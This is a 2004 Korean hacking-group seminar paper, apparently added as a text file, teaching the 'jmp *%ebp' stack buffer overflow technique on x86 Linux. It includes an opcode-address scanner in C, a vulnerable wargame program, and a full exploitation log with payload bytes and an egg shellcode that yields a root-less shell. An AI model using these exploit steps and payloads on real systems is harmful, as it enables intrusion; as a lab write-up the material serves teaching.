@@ -1,0 +1,305 @@
+; 2004년도에 작성했던 bof 에 관련된 문서입니다.
+; 이제는 bof와 fsb가 까마귀 고기를 먹었는지 기억조차 안나지만..
+
+
+                     "Advanced BufferOverflow Attack Skill"
+                                -- using jmp *%ebp --
+
+                                   .. 20040108 ..
+                             .. CNU aRg0s HackerGroup ..
+                                .. 지현석(binish) ..
+
+
+
+#_INDEX_#
+1. 버퍼오버플로우 공격기법의 발전
+2. jmp *%ebp 기법 소개
+3. jmp *%ebp 기법을 이용한 공격 예
+4. 참고
+5. 드리는 말씀
+
+#_버퍼오버플로우 공격기법의 발전_#
+Phrack 49호에 Aleph1이 "Smashing The Stack For Fun And Profit"을 발표하면서 BOF에 대한 공격기법이
+주된 관심사로 떠오르기 시작했습니다.
+
+초기 BOF는 리턴어드레스(Return Address:이하 ret)를 쉘코드 주소로 덮어씌움으로 공격이 이루어졌습니다.
+즉 EGG쉘이라고 불리는 프로그램을 실행시킨 후 ret를 EGG쉘의 주소값으로 단순히 덮어씌우는 방법입니다.
+
+이런 방법이후 여러가지 버퍼오버플로우 공격기법이 발전하게 되었습니다.
+
+x01. Frame Pointer Overflow
+프레임 포인터 오버플로우 기법은 단지 1바이트의 오버플로우일 때 쓰이는 방법입니다.
+프로그램 실행중 스택영역에서 ebp가 pop될때 그 값이 +4되는 것을 이용합니다.
+보통 ebp의 시작주소가 xbfff로 시작하기때문에 EGG의 주소(xbfff로 시작)와 맞아떨어지때문에 가능합니다.
+
+x02. .dtors Overflow (with FSB)
+main()함수가 exit(0)에 구애없이 종료될 때 참고하는 .dtors영역(정확히는 .dtors+4)을 쉘코드 주소로 
+덮어씌우는 기법입니다. 이 방법은 FSB(Format String Bug)와 함께 씌여집니다.
+
+x03. GOT Overflow (with FSB)
+위의 .dtors Overflow는 exit(0)대신에 _exit(0)을 이용하면 방지할 수 있습니다.
+그렇지만 GOT라는 영역을 덮어씌움으로써 또한 오버플로우를 수행할 수 있습니다.
+물론 이 방법도 FSB와 함께 씌여집니다.
+
+x04. OMEGA Project
+Lamagra라는 외국해커(소문에 의한 매우 어리다고 함)에 의해서 개발된 기법입니다.
+기존의 ret를 쉘코드로 덮어씌우는 대신 system()의 주소를 ret로 덮어씌움으로써 system("/bin/sh");를
+실행시켜 쉘을 획득합니다.
+
+x05. Return-To-Lib(fake_ebp)
+인자를 요하지 않는 함수를 연속적으로 호출하는 프로그램의 흐름을 이용한 공격기법입니다.
+ret를 leaveret 주소로 덮어씌우고 ebp에는 버퍼의 시작주소를 덮어씌운 후 버퍼에는 EGG주소값을 덮어씌움으로써
+ebp를 속여서(fake_ebp)쉘을 획득할 수 있습니다.
+
+예로 EGG의 주소가 0xEGG, buf의 주소가 0xBUF, leaveret의 주소가 0xLEAVERET일때,
+
+[0xEGG][0xBUF][0xLEAVERET]
+  buf    ebp       ret
+
+위와 같이 덮어씌움으로써 정상적으로 leave한 후 참고하는 ebp(->eip)를 따라가게 되고,
+ebp를 buf의 시작주소로 속였기때문에 buf의 시작주소로 돌아가게되어서 쉘이 뜨게 됩니다.
+
+x06. jmp *%ebp
+이번 세미나에서 자세히 알아보려는 기법입니다.
+
+#_jmp *%ebp 기법 소개_#
+jmp *%ebp 기법은 간단히 말해서 ret에 jmp *%ebp값을 덮어씌워주는 방법입니다.
+즉 복귀할때 ebp로 jmp하게 됩니다. 고전기법에선 쉘코드 주소로 점프했었습니다.
+물론 ebp는 우리가 조작할 수 있으며 ebp는 EGG를 가리키고 있기때문에 쉘을 획득하게 됩니다.
+
+그렇다면 이제 jmp *%ebp를 어떻게 주소값으로 표현할 수 있는지를 알아내야 합니다.
+ret에 jmp *%ebp라고 입력할 수는 없기때문입니다 :)
+따라서 아래와 같은 소스를 하나 작성해서 이 값을 우선 헥사값으로 알아봤습니다.
+
+/* jmp *%ebp 코드를 찾기위한 소스 by binish */
+/* test.c */
+main(int argc, char *argv[], char *env[])
+{
+        unsigned long get_esp(void)
+{
+                    __asm__("movl %esp,%eax");
+                    __asm__("jmp *%ebp");
+}
+        exit(0);
+}
+
+위 소스를 컴파일한 후 objdump로 해당코드를 찾았습니다.
+
+[binish@zeus beist]$ objdump -d test | more
+.
+.
+.
+08048324 <get_esp.0>:
+8048324:       55                      push   %ebp
+8048325:       89 e5                   mov    %esp,%ebp
+8048327:       83 ec 04                sub    $0x4,%esp
+804832a:       89 4d fc                mov    %ecx,0xfffffffc(%ebp)
+804832d:       89 e0                   mov    %esp,%eax
+804832f:       ff e5                   jmp    *%ebp //HERE!!
+8048331:       c9                      leave
+8048332:       c3                      ret
+8048333:       90                      nop
+.
+.
+.
+
+HERE!!에서 알 수 있듯이 jmp *%ebp는 xffxe5의 연속된 값으로 나타나집니다.
+따라서 이 xffxe5가 나타나는 영역의 값을 찾아냄으로써 jmp *%ebp값을 알아낼 수 있습니다.
+
+/* xff와 xe5가 연속적으로 나타나는 메모리영역을 찾아내서 해당 주소값을 출력 */
+/* by Null@Root */
+#include <stdio.h>
+#include <stdlib.h>
+#include <signal.h>
+unsigned int i=0;
+unsigned int a=0;
+unsigned char *p;
+
+void de(int j)
+{
+        printf("rnGot SIGSEGV:");
+        printf("%prn",p+a);
+        a++;
+        exit(0);
+}
+
+main(int argc, char* argv[])
+{
+        if(argc < 2) {
+                printf("%s <start address for searching 0xffe4>n", argv[0]);
+                exit(0);
+        }
+
+        sscanf(argv[1], "%x", &i);
+        printf("Using %xn", i);
+
+        p=(unsigned char *)i;
+        signal(SIGSEGV,de);
+        foo();
+}
+
+int foo()
+{
+        while((unsigned int)p+a < 0xbfffffff) {
+                fflush(stdout);
+                if( (*(p+a)==0xff) && (*(p+a+1)==0xe5) ) {
+                        printf("found it!! addr:%pn",p+a);
+                        a+=2;
+                        foo();
+                }
+                a++;
+        }
+        exit(0);
+}
+
+[binish@zeus beist]$ ./findesp 0x42000000
+Using 42000000
+found it!! addr:0x4211aa57
+found it!! addr:0x4211ccd3
+found it!! addr:0x4211da7b
+found it!! addr:0x4211e36f
+found it!! addr:0x4212999f
+
+Got SIGSEGV:0x4212f000
+
+0x42000000은 라이브러리 영역의 시작주소(?)입니다. 0xbfffffff(스택의 끝)까지 검색해서,
+xff와 xe5가 발견될시 해당 주소값을 출력해주고 있습니다.
+
+즉 위에서 출력된 5개의 주소값중 하나를 ret로 덮어씌운다면 jmp *%ebp가 일어나게됩니다.
+그렇다면 이제 취약한 프로그램을 예로 들어 이 기법을 이용한 쉘획득을 하겠습니다.
+
+#_jmp *%ebp 기법을 이용한 공격 예_#
+/* This wargame is made by beist (http://beist.org) */
+
+#include <stdio.h>
+#include <stdlib.h>
+
+main(int argc, char *argv[])
+{
+char buf[4];
+
+if(argc != 2)
+{
+printf("argc only 2n");
+return 0;
+}
+
+if(strlen(argv[0])!=3)
+{
+printf("argv0 length only 3n");
+return 0;
+}
+
+if(strlen(argv[1])!=12)
+{
+printf("argv1 length only 12n");
+return 0;
+}
+
+if(argv[1][11]=='xbf')
+{
+printf("welcome to blackholen");
+return 0;
+}
+
+memset(buf, 0x00, 4); 
+strncpy(buf, argv[1], 12);
+memset(buf, 0x00, strlen(argv[1])/2);
+}
+
+위 소스는 beist가 만든 BOF 취약점이 있는 프로그램입니다.
+
+strncpy(buf, argv[1], 12); 를 통해서 buf의 크기가 4바이트인데 이 부분에 12바이트를 덮어씌우게 함으로써
+자연적으로 BOF가 일어나지만 if(argv[1][11]=='xbf') 를 통해서 바로 EGG쉘을 획득(고전기법)할 수 없게 하였고,
+(EGG쉘의 시작주소는 xbfff입니다. 따라서 argv[1][11]이 xbf가 됩니다)
+memset(buf, 0x00, strlen(argv[1])/2); 를 통해서 6바이트를 NULL로 만들어버립니다.
+따라서 fake_ebp도 통하지 않습니다.
+
+물론 이 방법은 OMEGA 기법을 이용하면 쉘을 획득할 수 있으나 세미나의 초점에 맞추어 
+jmp *%ebp 기법을 이용하도록 하겠습니다.
+
+[binish@zeus beist]$ ./2 AAAAAAAAAAAA
+0xbffffb04  00 00 00 00 00 00 41 41 41 41 41 41 02 00 00 00   ......AAAAAA....
+            ~~~~~~~~~~~~~~~~~ ~~~~~~~~~~~~~~~~~
+0xbffffb14  54 fb ff bf 60 fb ff bf b8 24 01 40 02 00 00 00   T...`....$.@....
+0xbffffb24  4c 83 04 08 00 00 00 00 6d 83 04 08 fc 85 04 08   L.......m.......
+0xbffffb34  02 00 00 00 54 fb ff bf c4 82 04 08 4c 87 04 08   ....T.......L...
+0xbffffb44  50 a9 00 40 4c fb ff bf 0c 02 01 40 02 00 00 00   P..@L......@....
+
+Segmentation fault
+
+위의 예에서처럼 A(41)를 12개 입력할 경우 buf[0-3]와 ebp[2-3]가 NULL(0x00)로 채워지게 됩니다.
+그리고 ebp[0-1]와 ret는 A(41)로 채워지게되서 Segmentation fault가 일어나게 됩니다.
+
+이제 위에서 알아낸 jmp *%ebp 값(5개)중에서 하나(4212999f)를 택해서 ret로 덮어씌울것이고,
+EGG를 띄워서 그 주소값으로 ebp를 덮어씌우도록 하겠습니다.
+
+[00 00 00 00][00 00 ff bf][ jmp *%ebp ]
+<--- buf ---><--- ebp ---><--- ret --->
+
+[binish@zeus beist]$ ./egg
+Using address: 0xbffffae8
+[binish@zeus beist]$ ./env
+bffff307
+[binish@zeus beist]$ perl -e 'system "./2","AAAAAAxffxbfx9fx99x12x42"'
+0xbffff114  00 00 00 00 00 00 ff bf 9f 99 12 42 02 00 00 00   ...........B....
+            ~~~~~~~~~~~ ~~~~~~~~~~~ ~~~~~~~~~~~~~~
+                 NULL       ebp     ret(jmp *%ebp)
+
+0xbffff124  64 f1 ff bf 70 f1 ff bf b8 24 01 40 02 00 00 00   d...p....$.@....
+0xbffff134  4c 83 04 08 00 00 00 00 6d 83 04 08 fc 85 04 08   L.......m.......
+0xbffff144  02 00 00 00 64 f1 ff bf c4 82 04 08 4c 87 04 08   ....d.......L...
+0xbffff154  50 a9 00 40 5c f1 ff bf 0c 02 01 40 02 00 00 00   P..@......@....
+[binish@zeus beist]$ ps
+  PID   TTY   STAT  TIME COMMAND
+13515  ?      S    0:00 -bash
+13779  ?      S    0:00 ./egg
+13780  ?      S    0:00 /bin/bash
+13817  ?      R    0:00 ps
+
+위에서 알 수 있듯이 EGG의 정확한 시작주소는 0xbffff307입니다.
+그리고 우리는 성공적으로 ret에는 0x4212999f를 덮어씌웠고 ebp에는 0xbfff0000이 씌워졌습니다.
+따라서 프로그램이 진행되다가 ret의 0x4212999f를 만나게되서 jmp *%ebp가 일어나게 되고,
+ebp에는 0xbfff0000이 입력되어 있으므로 0xbfff0000으로 점프하게됩니다.
+쉘이 실행되지 못한 이유는 EGG의 주소(0xbffff307)와 점프된 주소(0xbfff0000)가 너무 멀어서입니다.
+
+스택에서는 높은 메모리 주소에서 낮은 메모리 주소로 데이터가 쌓이고,
+낮은 메모리 주소에서 높은 메모리 주소로 프로그램이 흘러갑니다.
+따라서 EGG의 시작주소가 0xbfff0000보다 낮은 범위에 있어야지 쉘을 획득할 수 있습니다.
+
+Low Memory Address ------> High Memory Address
+[ .......0x90(NOP)........shellcode......... ]
+   |
+   +------------------------------------------------ jmp *%ebp(0xbfff0000)
+
+이를위해서는 EGG의 크기를 매우 넓혀줘서 0xbfff보다 낮은 메모리 주소에 자리를 잡게하면 됩니다.
+따라서 EGG의 크기를 65536으로 넓혀서(기존 2048) 다시 공격합니다.
+
+[binish@zeus beist]$ ./egg2
+Using address: 0xbffffae8
+[binish@zeus beist]$ ./env
+bffefb07
+[binish@zeus beist]$ perl -e 'system "./2","AAAAAAxffxbfx9fx99x12x42"'
+0xbffef914  00 00 00 00 00 00 ff bf 9f 99 12 42 02 00 00 00   ...........B....
+0xbffef924  64 f9 fe bf 70 f9 fe bf b8 24 01 40 02 00 00 00   d...p....$.@....
+0xbffef934  4c 83 04 08 00 00 00 00 6d 83 04 08 fc 85 04 08   L.......m.......
+0xbffef944  02 00 00 00 64 f9 fe bf c4 82 04 08 4c 87 04 08   ....d.......L...
+0xbffef954  50 a9 00 40 5c f9 fe bf 0c 02 01 40 02 00 00 00   P..@......@....
+sh-2.05b$ ps
+  PID   TTY   STAT  TIME COMMAND
+13515  ?      S    0:00 -bash
+13933  ?      S    0:00 ./egg2
+13934  ?      S    0:00 /bin/bash
+13961  ?      S    0:00 perl -e system "./2","AAAAAAxffxbfx9fx99x12x42"
+13962  ?      S    0:00 /bin/sh
+13963  ?      R    0:00 ps
+
+위에서 보는것처럼 EGG의 시작주소가 0xbffefb07입니다. 즉 점프되는 ebp의 주소(0xbfff)보다 낮은 메모리 영역에
+자리잡고 있기때문에(물론 NOP로 시작됨) 쉘을 획득할 수 있습니다.
+아마도 NOP의 어느 한 영역으로 점프되었을거고 NOP를 타고 흐르다가 쉘코드를 만나게 되었을겁니다^^
+
+#_참고_#
+[1] Null@Root "Jmp *%esp, Call *%esp 를 이용한 Buffer Overflow Exploit 제작"
+  http://null2root.org/lecture/openbook/JmpEsp_CallEsp.txt
+[2] BEIST.ORG
+  http://beist.org 
